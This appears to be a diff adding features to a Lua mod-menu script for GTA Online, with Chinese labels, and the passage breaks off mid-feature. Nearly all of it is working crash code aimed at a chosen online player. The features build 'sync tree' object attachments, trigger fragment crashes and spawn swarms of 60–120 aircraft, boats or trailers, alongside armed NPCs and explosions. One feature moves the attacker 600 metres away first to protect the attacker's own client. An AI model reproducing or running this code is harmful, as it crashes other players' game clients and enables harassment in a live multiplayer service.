+        Script.QueueJob(function()
+            local player_ped = Players.GetCPed(playerId)
+            if not player_ped then
+                GUI.AddToast("攻击崩溃", "无法获取目标玩家", 3000)
+                return
+            end
+
+            local target_ped_handle = GTA.PointerToHandle(player_ped)
+            local target_pos = player_ped.Position
+            local spawn_pos = {x = target_pos.x, y = target_pos.y, z = target_pos.z + 0.6}
+
+            local function tksk_attack_task(ped_handle, target_ped)
+                Natives.InvokeVoid(0x02A0C9720B854BFA, ped_handle, true)
+                Natives.InvokeVoid(0xBF0FD6E56C964FCB, ped_handle, 0x1B06D571, 9999, false, true)
+                Natives.InvokeVoid(0xADF692B254977C0C, ped_handle, 0x1B06D571, true)
+                Natives.InvokeVoid(0x3EDCB0505123623B, ped_handle, true, 0x1B06D571)
+                Natives.InvokeVoid(0x3C606747B23E497B, ped_handle, true)
+                Natives.InvokeVoid(0x060D6E96F8B8E48D, ped_handle, true)
+                Natives.InvokeVoid(0xF166E48407BAC484, ped_handle, target_ped, 0, 0)
+                Natives.InvokeVoid(0xCC97B29285B1DC3B, ped_handle, 100)
+                Natives.InvokeVoid(0x406137F8EF90EAF5, ped_handle, 100)
+            end
+
+            for loop = 1, 3 do
+                for i = 0, 2 do
+                    local ped = GTA.CreatePed(0xD266D9D6, 26, spawn_pos.x, spawn_pos.y, spawn_pos.z, 0.0, true, false)
+                    if ped ~= 0 then
+                        Natives.InvokeVoid(0x3882114BDE571AD4, ped, false)
+                        Natives.InvokeVoid(0xAD738C3085FE7E11, ped, true, true)
+                        tksk_attack_task(ped, target_ped_handle)
+                        if i % 2 == 0 then
+                            Natives.InvokeVoid(0xBF0FD6E56C964FCB, ped, 0xAB564B93, 9999, false, true)
+                            Natives.InvokeVoid(0xADF692B254977C0C, ped, 0xAB564B93, true)
+                        end
+                        local player_group = Natives.InvokeInt(0x810E8431C0614BF9, playerId)
+                        Natives.InvokeVoid(0x9F3480FE65DB31B5, ped, player_group, 0x6F0783F5)
+                        Natives.InvokeVoid(0xBF25EB89375A37AD, 0x6F0783F5, 0x6F0783F5, 5)
+                    end
+                    Script.Yield(1)
+                end
+                Script.Yield(1)
+            end
+            GUI.AddToast("攻击崩溃", "已生成攻击型NPC", 3000)
+        end)
+    end, true
+)
+
+-- ========== 圣裁V1 ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("HolyJudgmentV1"),
+    "圣裁V1",
+    eFeatureType.Button,
+    "5次碎片+5次同步树崩溃，然后生成60辆Hunter环绕目标，10秒后自动清理",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        Script.QueueJob(function()
+            GUI.AddToast("圣裁V1", "开始圣裁V1攻击...", 3000)
+
+            local targetPed = Players.GetCPed(playerId)
+            if not targetPed then
+                GUI.AddToast("圣裁V1", "无法获取目标玩家实体", 3000)
+                return
+            end
+
+            local pos = targetPed.Position
+            local allEntities = {}
+
+            -- 5次碎片崩溃
+            for i = 1, 5 do
+                local fragments = SpawnFragmentsAtPlayer(playerId, 30, allEntities)
+                Script.Yield(500)
+            end
+
+            -- 5次同步树崩溃
+            for i = 1, 5 do
+                Script.QueueJob(function()
+                    local objectHash = 1352295901
+                    STREAMING.REQUEST_MODEL(objectHash)
+                    local timeout = 0
+                    while not STREAMING.HAS_MODEL_LOADED(objectHash) and timeout < 100 do
+                        Script.Yield(5); timeout = timeout + 1
+                    end
+                    if STREAMING.HAS_MODEL_LOADED(objectHash) then
+                        local main_sync = GTA.CreateWorldObject(objectHash, pos.x + 300, pos.y + 300, pos.z + 300, true, true)
+                        if main_sync then
+                            table.insert(allEntities, main_sync)
+                            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(main_sync)
+                            local sync_children = {849958566, -568220328, 2155335200, 1272323782, 1296557055, 29828513, 2250084685, 2349112599, 1599985244, 3523942264, 3457195100, 3762929870, 1016189997, 861098586, 3613262246, 3245733464, 2494305715, 671173206, 3769155529, 978689073, 100436592, 3107991431, 1327834842, 1239708330}
+                            for j = 1, #sync_children do
+                                STREAMING.REQUEST_MODEL(sync_children[j])
+                                local ct = 0
+                                while not STREAMING.HAS_MODEL_LOADED(sync_children[j]) and ct < 50 do
+                                    Script.Yield(5); ct = ct + 1
+                                end
+                                if STREAMING.HAS_MODEL_LOADED(sync_children[j]) then
+                                    local child = GTA.CreateWorldObject(sync_children[j], pos.x + 300, pos.y + 300, pos.z + 300, true, true)
+                                    if child then
+                                        table.insert(allEntities, child)
+                                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(child)
+                                        Natives.InvokeVoid(0x6B9BBD38AB0796DF, child, main_sync, 0, 0, 0, 0, 0, 0, 0, false, false, false, false, 2, true)
+                                    end
+                                end
+                            end
+                            local time = Time.Get() + 1
+                            while time > Time.Get() do
+                                Script.Yield(math.random(0, 5))
+                                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(main_sync, pos.x + math.random(-1, 1), pos.y + math.random(-1, 1), pos.z + math.random(-1, 1), false, false, false, false)
+                            end
+                        end
+                        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(objectHash)
+                    end
+                end)
+                Script.Yield(50)
+            end
+
+            Script.Yield(2000)
+
+            -- 60辆Hunter
+            GUI.AddToast("圣裁V1", "生成60辆Hunter", 2000)
+            local vehHash = -42959138
+            STREAMING.REQUEST_MODEL(vehHash)
+            local mt = 0
+            while not STREAMING.HAS_MODEL_LOADED(vehHash) and mt < 100 do
+                Script.Yield(5); mt = mt + 1
+            end
+
+            if not STREAMING.HAS_MODEL_LOADED(vehHash) then
+                GUI.AddToast("圣裁V1", "Hunter模型加载失败", 3000)
+                return
+            end
+
+            for i = 1, 60 do
+                local angle = (i / 60) * 360
+                local rad = angle * (math.pi / 180)
+                local spawnX = pos.x + 10.0 * math.cos(rad)
+                local spawnY = pos.y + 10.0 * math.sin(rad)
+                local dx = pos.x - spawnX
+                local dy = pos.y - spawnY
+                local targetHeading = (math.deg(atan2(dy, dx)) - 90) % 360
+                local vehicle = GTA.SpawnVehicle(vehHash, spawnX, spawnY, pos.z, targetHeading, true, false)
+                if ENTITY.DOES_ENTITY_EXIST(vehicle) then
+                    table.insert(allEntities, vehicle)
+                    local netId = NETWORK.VEH_TO_NET(vehicle)
+                    if netId > 0 then
+                        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, false)
+                        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netId, true)
+                    end
+                    if networkRQ(vehicle) then
+                        ENTITY.SET_ENTITY_COLLISION(vehicle, false, true)
+                        ENTITY.FREEZE_ENTITY_POSITION(vehicle, true)
+                        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
+                        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, false)
+                        VEHICLE.SET_VEHICLE_KEEP_ENGINE_ON_WHEN_ABANDONED(vehicle, true)
+                    end
+                end
+                if i % 5 == 0 then Script.Yield(1) end
+            end
+
+            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehHash)
+            GUI.AddToast("圣裁V1", string.format("圣裁V1完成! 共生成 %d 个实体，10秒后自动清理", #allEntities), 3000)
+
+            Script.Yield(10000)
+            GUI.AddToast("圣裁V1", "开始清理所有实体...", 2000)
+            for _, ent in ipairs(allEntities) do
+                if ENTITY.DOES_ENTITY_EXIST(ent) then deleteEnt(ent) end
+                Script.Yield(5)
+            end
+            collectgarbage("collect")
+            GUI.AddToast("圣裁V1", "清理完成", 2000)
+        end)
+    end, true
+)
+
+-- ========== 圣裁V2 ==========
+local holyV2_drawing = false
+local holyV2_drawEndTime = 0
+
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("HolyJudgmentV2"),
+    "圣裁V2",
+    eFeatureType.Button,
+    "5次碎片+5次同步树崩溃，然后60辆Hunter+60辆avenger2环绕目标，10秒后自动清理",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        Script.QueueJob(function()
+            GUI.AddToast("圣裁V2", "开始圣裁V2攻击...", 3000)
+
+            local targetPed = Players.GetCPed(playerId)
+            if not targetPed then
+                GUI.AddToast("圣裁V2", "无法获取目标玩家实体", 3000)
+                return
+            end
+
+            local pos = targetPed.Position
+            local allEntities = {}
+
+            -- 5次碎片崩溃
+            for i = 1, 5 do
+                local fragments = SpawnFragmentsAtPlayer(playerId, 30, allEntities)
+                Script.Yield(500)
+            end
+
+            -- 5次同步树崩溃
+            for i = 1, 5 do
+                Script.QueueJob(function()
+                    local objectHash = 1352295901
+                    STREAMING.REQUEST_MODEL(objectHash)
+                    local timeout = 0
+                    while not STREAMING.HAS_MODEL_LOADED(objectHash) and timeout < 100 do
+                        Script.Yield(5); timeout = timeout + 1
+                    end
+                    if STREAMING.HAS_MODEL_LOADED(objectHash) then
+                        local main_sync = GTA.CreateWorldObject(objectHash, pos.x + 300, pos.y + 300, pos.z + 300, true, true)
+                        if main_sync then
+                            table.insert(allEntities, main_sync)
+                            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(main_sync)
+                            local sync_children = {849958566, -568220328, 2155335200, 1272323782, 1296557055, 29828513, 2250084685, 2349112599, 1599985244, 3523942264, 3457195100, 3762929870, 1016189997, 861098586, 3613262246, 3245733464, 2494305715, 671173206, 3769155529, 978689073, 100436592, 3107991431, 1327834842, 1239708330}
+                            for j = 1, #sync_children do
+                                STREAMING.REQUEST_MODEL(sync_children[j])
+                                local ct = 0
+                                while not STREAMING.HAS_MODEL_LOADED(sync_children[j]) and ct < 50 do
+                                    Script.Yield(5); ct = ct + 1
+                                end
+                                if STREAMING.HAS_MODEL_LOADED(sync_children[j]) then
+                                    local child = GTA.CreateWorldObject(sync_children[j], pos.x + 300, pos.y + 300, pos.z + 300, true, true)
+                                    if child then
+                                        table.insert(allEntities, child)
+                                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(child)
+                                        Natives.InvokeVoid(0x6B9BBD38AB0796DF, child, main_sync, 0, 0, 0, 0, 0, 0, 0, false, false, false, false, 2, true)
+                                    end
+                                end
+                            end
+                            local time = Time.Get() + 1
+                            while time > Time.Get() do
+                                Script.Yield(math.random(0, 5))
+                                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(main_sync, pos.x + math.random(-1, 1), pos.y + math.random(-1, 1), pos.z + math.random(-1, 1), false, false, false, false)
+                            end
+                        end
+                        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(objectHash)
+                    end
+                end)
+                Script.Yield(50)
+            end
+
+            Script.Yield(2000)
+
+            -- 120辆载具
+            local hunterHash = -42959138
+            local avenger2Hash = 408970549
+            STREAMING.REQUEST_MODEL(hunterHash)
+            STREAMING.REQUEST_MODEL(avenger2Hash)
+            local mt = 0
+            while (not STREAMING.HAS_MODEL_LOADED(hunterHash) or not STREAMING.HAS_MODEL_LOADED(avenger2Hash)) and mt < 150 do
+                Script.Yield(5); mt = mt + 1
+            end
+
+            if not STREAMING.HAS_MODEL_LOADED(hunterHash) or not STREAMING.HAS_MODEL_LOADED(avenger2Hash) then
+                GUI.AddToast("圣裁V2", "模型加载失败", 3000)
+                return
+            end
+
+            -- 外圈Hunter
+            for i = 1, 60 do
+                local angle = (i / 60) * 360
+                local rad = angle * (math.pi / 180)
+                local spawnX = pos.x + 10.0 * math.cos(rad)
+                local spawnY = pos.y + 10.0 * math.sin(rad)
+                local dx = pos.x - spawnX
+                local dy = pos.y - spawnY
+                local targetHeading = (math.deg(atan2(dy, dx)) - 90) % 360
+                local vehicle = GTA.SpawnVehicle(hunterHash, spawnX, spawnY, pos.z, targetHeading, true, false)
+                if ENTITY.DOES_ENTITY_EXIST(vehicle) then
+                    table.insert(allEntities, vehicle)
+                    local netId = NETWORK.VEH_TO_NET(vehicle)
+                    if netId > 0 then
+                        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, false)
+                        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netId, true)
+                    end
+                    if networkRQ(vehicle) then
+                        ENTITY.SET_ENTITY_COLLISION(vehicle, false, true)
+                        ENTITY.FREEZE_ENTITY_POSITION(vehicle, true)
+                        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
+                        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, false)
+                        VEHICLE.SET_VEHICLE_KEEP_ENGINE_ON_WHEN_ABANDONED(vehicle, true)
+                    end
+                end
+                if i % 5 == 0 then Script.Yield(1) end
+            end
+
+            -- 内圈avenger2
+            for i = 1, 60 do
+                local angle = ((i + 0.5) / 60) * 360
+                local rad = angle * (math.pi / 180)
+                local spawnX = pos.x + 5.0 * math.cos(rad)
+                local spawnY = pos.y + 5.0 * math.sin(rad)
+                local dx = pos.x - spawnX
+                local dy = pos.y - spawnY
+                local targetHeading = (math.deg(atan2(dy, dx)) - 90) % 360
+                local vehicle = GTA.SpawnVehicle(avenger2Hash, spawnX, spawnY, pos.z, targetHeading, true, false)
+                if ENTITY.DOES_ENTITY_EXIST(vehicle) then
+                    table.insert(allEntities, vehicle)
+                    local netId = NETWORK.VEH_TO_NET(vehicle)
+                    if netId > 0 then
+                        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, false)
+                        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netId, true)
+                    end
+                    if networkRQ(vehicle) then
+                        ENTITY.SET_ENTITY_COLLISION(vehicle, false, true)
+                        ENTITY.FREEZE_ENTITY_POSITION(vehicle, true)
+                        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
+                        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, false)
+                        VEHICLE.SET_VEHICLE_KEEP_ENGINE_ON_WHEN_ABANDONED(vehicle, true)
+                    end
+                end
+                if i % 5 == 0 then Script.Yield(1) end
+            end
+
+            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hunterHash)
+            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(avenger2Hash)
+            GUI.AddToast("圣裁V2", string.format("圣裁V2完成! 共生成 %d 个实体，10秒后自动清理", #allEntities), 3000)
+
+            Script.Yield(10000)
+            GUI.AddToast("圣裁V2", "开始清理所有实体...", 2000)
+            for _, ent in ipairs(allEntities) do
+                if ENTITY.DOES_ENTITY_EXIST(ent) then deleteEnt(ent) end
+                Script.Yield(5)
+            end
+            collectgarbage("collect")
+            GUI.AddToast("圣裁V2", "清理完成", 2000)
+        end)
+    end, true
+)
+
+-- ========== Echo欧美崩溃V2 ==========
+local echoOmV2_drawing = false
+local echoOmV2_drawEndTime = 0
+
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("EchoOmCrashV2"),
+    "Echo欧美崩溃V2",
+    eFeatureType.Button,
+    "⚠️ 不到万不得已，不要使用！7次崩溃攻击(2次同步树+5次碎片)+120辆载具攻击，距离过近自动传送",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if not playerId or playerId < 0 then
+            GUI.AddToast("Echo欧美崩溃V2", "请先选择一个玩家", 3000)
+            return
+        end
+
+        -- 自动传送逻辑：若本地玩家与目标距离 < 600 米，则传送到目标东侧600米处
+        local function teleportIfTooClose()
+            local localPed = GTA.GetLocalPed()
+            local targetPed = Players.GetCPed(playerId)
+            if not localPed or not targetPed then return end
+            
+            local localPos = localPed.Position
+            local targetPos = targetPed.Position
+            local dx = localPos.x - targetPos.x
+            local dy = localPos.y - targetPos.y
+            local dz = localPos.z - targetPos.z
+            local dist = math.sqrt(dx*dx + dy*dy + dz*dz)
+            
+            if dist < 600.0 then
+                local newX = targetPos.x + 600.0
+                local newY = targetPos.y
+                local newZ = targetPos.z
+                -- 获取地面高度
+                local groundFound, groundZ = GTA.GetGroundZ(newX, newY)
+                if groundFound then
+                    newZ = groundZ + 1.0
+                end
+                local pedHandle = GTA.PointerToHandle(localPed)
+                if pedHandle and pedHandle ~= 0 then
+                    Natives.InvokeVoid(0x06843DA7060A026B, pedHandle, newX, newY, newZ, false, false, false, false)
+                    Script.Yield(100)
+                    GUI.AddToast("Echo欧美崩溃V2", "⚠️ 距离过近，已自动传送至安全位置", 3000, eToastPos.TOP_RIGHT)
+                end
+            end
+        end
+        
+        teleportIfTooClose()
+        
+        Script.QueueJob(function()
+            local allEntities = {}
+            local success, result = pcall(function()
+                GUI.AddToast("Echo欧美崩溃V2", "开始7次同步攻击", 2000)
+
+                local targetPed = Players.GetCPed(playerId)
+                if not targetPed then
+                    GUI.AddToast("Echo欧美崩溃V2", "玩家已离开", 3000)
+                    return
+                end
+
+                local targetPos = targetPed.Position
+
+                local function ExecuteSyncTree(playerId, index)
+                    Script.QueueJob(function()
+                        local objectHash = 1352295901
+                        STREAMING.REQUEST_MODEL(objectHash)
+                        local timeout = 0
+                        while not STREAMING.HAS_MODEL_LOADED(objectHash) and timeout < 200 do
+                            Script.Yield(10); timeout = timeout + 1
+                        end
+
+                        if not STREAMING.HAS_MODEL_LOADED(objectHash) then return end
+
+                        local player_ped = Players.GetCPed(playerId)
+                        if not player_ped then return end
+
+                        local pos = player_ped.Position
+                        local main_sync = GTA.CreateWorldObject(objectHash, pos.x + 300, pos.y + 300, pos.z + 300, true, true)
+                        if main_sync then
+                            table.insert(allEntities, main_sync)
+                            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(main_sync)
+                            local sync_children = {849958566, -568220328, 2155335200, 1272323782, 1296557055, 29828513, 2250084685, 2349112599, 1599985244, 3523942264, 3457195100, 3762929870, 1016189997, 861098586, 3613262246, 3245733464, 2494305715, 671173206, 3769155529, 978689073, 100436592, 3107991431, 1327834842, 1239708330}
+                            for i = 1, #sync_children do
+                                STREAMING.REQUEST_MODEL(sync_children[i])
+                                local ct = 0
+                                while not STREAMING.HAS_MODEL_LOADED(sync_children[i]) and ct < 200 do
+                                    Script.Yield(10); ct = ct + 1
+                                end
+                                if STREAMING.HAS_MODEL_LOADED(sync_children[i]) then
+                                    local child = GTA.CreateWorldObject(sync_children[i], pos.x + 300, pos.y + 300, pos.z + 300, true, true)
+                                    if child then
+                                        table.insert(allEntities, child)
+                                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(child)
+                                        Natives.InvokeVoid(0x6B9BBD38AB0796DF, child, main_sync, 0, 0, 0, 0, 0, 0, 0, false, false, false, false, 2, true)
+                                    end
+                                end
+                            end
+                            local time = Time.Get() + 2
+                            while time > Time.Get() do
+                                Script.Yield(math.random(0, 10))
+                                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(main_sync, pos.x + math.random(-1, 1), pos.y + math.random(-1, 1), pos.z + math.random(-1, 1), false, false, false, false)
+                            end
+                        end
+                        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(objectHash)
+                    end)
+                end
+
+                -- 2次同步树
+                for i = 1, 2 do ExecuteSyncTree(playerId, i); Script.Yield(50) end
+                
+                -- 5次碎片
+                for i = 1, 5 do
+                    local fragments = SpawnFragmentsAtPlayer(playerId, 30, allEntities)
+                    Script.Yield(500)
+                end
+
+                Script.Yield(2000)
+
+                -- 120辆载具攻击
+                GUI.AddToast("Echo欧美崩溃V2", "开始载具攻击", 2000)
+
+                local hunterHash = -42959138
+                local chernobogHash = -692292317
+
+                STREAMING.REQUEST_MODEL(hunterHash)
+                STREAMING.REQUEST_MODEL(chernobogHash)
+                local timeout = 0
+                while (not STREAMING.HAS_MODEL_LOADED(hunterHash) or not STREAMING.HAS_MODEL_LOADED(chernobogHash)) and timeout < 500 do
+                    Script.Yield(10); timeout = timeout + 1
+                end
+
+                if timeout >= 500 then
+                    GUI.AddToast("Echo欧美崩溃V2", "模型加载失败", 3000)
+                    return
+                end
+
+                local hunterCount = 0
+                local chernobogCount = 0
+
+                for i = 1, 60 do
+                    local vehicleHandle = GTA.SpawnVehicle(hunterHash, targetPos.x + (math.random() - 0.5) * 2.0, targetPos.y + (math.random() - 0.5) * 2.0, targetPos.z + 0.5, math.random(0, 360), true, true)
+                    if vehicleHandle and vehicleHandle ~= 0 then
+                        hunterCount = hunterCount + 1
+                        table.insert(allEntities, vehicleHandle)
+                        Natives.InvokeVoid(0x1C99BB7B6E96D16F, vehicleHandle, 0.0, 0.0, -5000.0)
+                    end
+                    if i % 5 == 0 then Script.Yield(2) end
+                end
+
+                for i = 1, 60 do
+                    local vehicleHandle = GTA.SpawnVehicle(chernobogHash, targetPos.x + (math.random() - 0.5) * 2.0, targetPos.y + (math.random() - 0.5) * 2.0, targetPos.z + 0.5, math.random(0, 360), true, true)
+                    if vehicleHandle and vehicleHandle ~= 0 then
+                        chernobogCount = chernobogCount + 1
+                        table.insert(allEntities, vehicleHandle)
+                        Natives.InvokeVoid(0x1C99BB7B6E96D16F, vehicleHandle, 0.0, 0.0, -5000.0)
+                    end
+                    if i % 5 == 0 then Script.Yield(2) end
+                end
+
+                -- 爆炸攻击
+                for i = 1, 20 do
+                    FIRE.ADD_EXPLOSION(targetPos.x + math.random(-10, 10), targetPos.y + math.random(-10, 10), targetPos.z + math.random(5, 15), 29, 100.0, true, false, 2.0)
+                    Script.Yield(30)
+                end
+
+                GUI.AddToast("Echo欧美崩溃V2", string.format("完成! 7次崩溃 + %d 辆载具", hunterCount + chernobogCount), 3000)
+                
+                -- 10秒后自动清理
+                Script.Yield(10000)
+                GUI.AddToast("Echo欧美崩溃V2", string.format("10秒已到，开始清理 %d 个实体...", #allEntities), 2000)
+                for _, ent in ipairs(allEntities) do
+                    Script.QueueJob(function()
+                        if ent and ENTITY.DOES_ENTITY_EXIST(ent) then
+                            local netId = NETWORK.VEH_TO_NET(ent)
+                            if netId > 0 then NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, false) end
+                            networkRQ(ent)
+                            deleteEnt(ent)
+                        end
+                    end)
+                end
+                allEntities = {}
+                GUI.AddToast("Echo欧美崩溃V2", "清理完成", 2000)
+            end)
+
+            if not success then
+                GUI.AddToast("Echo欧美崩溃V2", "执行错误", 3000)
+            end
+        end)
+    end, true
+)
+
+-- ========== 道士崩溃 ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("ColdRiceCrash"),
+    "道士崩溃",
+    eFeatureType.Button,
+    "生成TaoTranslator2并触发爆炸",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then GUI.AddToast("冷饭崩溃", "请先选择一个玩家", 2000); return end
+        
+        Script.QueueJob(function()
+            local modelHash = Utils.Joaat("cs_taostranslator2")
+            local weaponHash = 0xB1CA77B1
+            
+            for i = 1, 10 do
+                local currentTarget = Players.GetCPed(playerId)
+                if not currentTarget then break end
+                local targetCoords = currentTarget.Position
+                
+                local pedHandle = GTA.CreatePed(modelHash, 26, targetCoords.x, targetCoords.y, targetCoords.z + 0.1, 0.0, true, false)
+                if pedHandle ~= 0 then
+                    local targetHandle = GTA.PointerToHandle(currentTarget)
+                    Natives.InvokeVoid(0x02A0C9720B854BFA, pedHandle, true)
+                    Natives.InvokeVoid(0xBF0FD6E56C964FCB, pedHandle, weaponHash, 9999, false, true)
+                    Natives.InvokeVoid(0xADF692B254977C0C, pedHandle, weaponHash, true)
+                    Natives.InvokeVoid(0xF166E48407BAC484, pedHandle, targetHandle, 0, 0)
+                    Script.Yield(50)
+                    Natives.InvokeVoid(0x5D6B2D4830A67C62, pedHandle, targetCoords.x, targetCoords.y, targetCoords.z, 1000, weaponHash, 1, 1, 0, 1, 0, 0, 0)
+                    Script.Yield(300)
+                end
+                Script.Yield(100)
+            end
+            
+            GUI.AddToast("冷饭崩溃", "执行完成", 2000)
+        end)
+    end, true
+)
+
+-- ========== 拖船崩溃 ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("TugCrash"),
+    "拖船崩溃",
+    eFeatureType.Button,
+    "100辆拖船+7次同步树崩溃，并发执行",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then GUI.AddToast("拖船崩溃", "请先选择一个玩家", 2000); return end
+        
+        Script.QueueJob(function()
+            local targetPed = Players.GetCPed(playerId)
+            if not targetPed then GUI.AddToast("拖船崩溃", "无法获取目标", 2000); return end
+            
+            local pos = targetPed.Position
+            local allEntities = {}
+            
+            -- 并发执行：生成拖船和同步树崩溃
+            -- 线程1：生成100辆拖船
+            Script.QueueJob(function()
+                local tugHash = Utils.Joaat("tug")
+                STREAMING.REQUEST_MODEL(tugHash)
+                local timeout = 0
+                while not STREAMING.HAS_MODEL_LOADED(tugHash) and timeout < 200 do
+                    Script.Yield(10); timeout = timeout + 1
+                end
+                
+                if not STREAMING.HAS_MODEL_LOADED(tugHash) then
+                    GUI.AddToast("拖船崩溃", "拖船模型加载失败", 3000)
+                    return
+                end
+                
+                GUI.AddToast("拖船崩溃", "开始生成100辆拖船...", 2000)
+                for i = 1, 100 do
+                    local spawnX = pos.x + (math.random() - 0.5) * 20
+                    local spawnY = pos.y + (math.random() - 0.5) * 20
+                    local spawnZ = pos.z + 3 + math.random(0, 5)
+                    local vehicle = GTA.CreateVehicle(tugHash, spawnX, spawnY, spawnZ, targetPed.Heading, true, false)
+                    if vehicle and vehicle ~= 0 then
+                        table.insert(allEntities, vehicle)
+                    end
+                    Script.Yield(30)
+                end
+                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(tugHash)
+                GUI.AddToast("拖船崩溃", string.format("拖船生成完成! 共 %d 辆", #allEntities), 3000)
+            end)
+            
+            -- 线程2-8：7次同步树崩溃（并发执行）
+            for syncIdx = 1, 7 do
+                Script.QueueJob(function()
+                    local objectHash = Utils.Joaat("prop_pooltable_02")
+                    STREAMING.REQUEST_MODEL(objectHash)
+                    local timeout = 0
+                    while not STREAMING.HAS_MODEL_LOADED(objectHash) and timeout < 100 do
+                        Script.Yield(10); timeout = timeout + 1
+                    end
+                    
+                    if not STREAMING.HAS_MODEL_LOADED(objectHash) then
+                        return
+                    end
+                    
+                    local main_sync = GTA.CreateWorldObject(objectHash, pos.x + 300, pos.y + 300, pos.z + 300, true, true)
+                    if main_sync then
+                        table.insert(allEntities, main_sync)
+                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(main_sync)
+                        
+                        local sync_children = {849958566, -568220328, 2155335200, 1272323782, 1296557055, 29828513, 2250084685, 2349112599, 1599985244, 3523942264, 3457195100, 3762929870, 1016189997, 861098586, 3613262246, 3245733464, 2494305715, 671173206, 3769155529, 978689073, 100436592, 3107991431, 1327834842, 1239708330}
+                        
+                        for j = 1, #sync_children do
+                            STREAMING.REQUEST_MODEL(sync_children[j])
+                            local ct = 0
+                            while not STREAMING.HAS_MODEL_LOADED(sync_children[j]) and ct < 50 do
+                                Script.Yield(5); ct = ct + 1
+                            end
+                            if STREAMING.HAS_MODEL_LOADED(sync_children[j]) then
+                                local child = GTA.CreateWorldObject(sync_children[j], pos.x + 300, pos.y + 300, pos.z + 300, true, true)
+                                if child then
+                                    table.insert(allEntities, child)
+                                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(child)
+                                    Natives.InvokeVoid(0x6B9BBD38AB0796DF, child, main_sync, 0, 0, 0, 0, 0, 0, 0, 0, false, false, false, false, 2, true)
+                                end
+                            end
+                        end
+                        
+                        -- 快速移动同步树到目标位置
+                        local time = Time.Get() + 1
+                        while time > Time.Get() do
+                            Script.Yield(math.random(0, 5))
+                            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(main_sync, pos.x + math.random(-1, 1), pos.y + math.random(-1, 1), pos.z + math.random(-1, 1), false, false, false, false)
+                        end
+                    end
+                    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(objectHash)
+                end)
+            end
+            
+            GUI.AddToast("拖船崩溃", string.format("完成! 100辆拖船 + 7次同步树崩溃", #allEntities), 3000)
+            
+            -- 10秒后自动清理
+            Script.Yield(10000)
+            GUI.AddToast("拖船崩溃", string.format("10秒已到，开始清理 %d 个实体...", #allEntities), 2000)
+            for _, ent in ipairs(allEntities) do
+                Script.QueueJob(function()
+                    if ent and ENTITY.DOES_ENTITY_EXIST(ent) then
+                        local netId = NETWORK.VEH_TO_NET(ent)
+                        if netId > 0 then NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, false) end
+                        networkRQ(ent)
+                        deleteEnt(ent)
+                    end
+                end)
+            end
+            allEntities = {}
+            GUI.AddToast("拖船崩溃", "清理完成", 2000)
+        end)
+    end, true
+)
+
+-- ========== 拖车崩溃 ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("TrailerCrash"),
+    "拖车崩溃",
+    eFeatureType.Button,
+    "生成100辆拖车 + 5次同步树崩溃 + 2次碎片崩溃，并发执行，10秒后自动清理",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then
+            GUI.AddToast("拖车崩溃", "❌ 请先选择一个玩家", 2000, eToastPos.BOTTOM_RIGHT)
+            return
+        end
+
+        Script.QueueJob(function()
+            local targetPed = Players.GetCPed(playerId)
+            if not targetPed then
+                GUI.AddToast("拖车崩溃", "❌ 无法获取目标玩家", 2000)
+                return
+            end
+
+            local pos = targetPed.Position
+            local allEntities = {}
+
+            -- 拖车模型哈希
+            local trailerHash = Utils.Joaat("trailers")
+
+            -- 预加载拖车模型
+            STREAMING.REQUEST_MODEL(trailerHash)
+            local timeout = 0
+            while not STREAMING.HAS_MODEL_LOADED(trailerHash) and timeout < 200 do
+                Script.Yield(10)
+                timeout = timeout + 1
+            end
+            if not STREAMING.HAS_MODEL_LOADED(trailerHash) then
+                GUI.AddToast("拖车崩溃", "❌ 拖车模型加载失败", 3000)
+                return
+            end
+
+            GUI.AddToast("拖车崩溃", "🚚 开始并发执行：100辆拖车 + 5次同步树 + 2次碎片", 3000, eToastPos.TOP_RIGHT)
+
+            -- 1. 生成100辆拖车（并发）
+            Script.QueueJob(function()
+                local spawnCount = 0
+                for i = 1, 100 do
